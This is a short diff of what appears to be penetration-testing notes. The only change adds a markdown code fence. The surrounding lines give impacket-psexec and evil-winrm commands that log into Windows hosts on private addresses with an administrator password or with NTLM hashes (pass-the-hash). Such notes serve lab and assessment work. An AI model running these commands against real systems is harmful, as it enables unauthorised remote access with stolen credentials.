@@ -17,6 +17,7 @@ impacket-psexec Administrator:P@ssw0rd@192.168.10.131
 impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 Orlando@192.168.10.122 
 
 ```
+```
 evil-winrm -i 192.168.43.5 -u Administrator -H d958f23d92281df0b62a6d7e9f42ee88
 ```
 
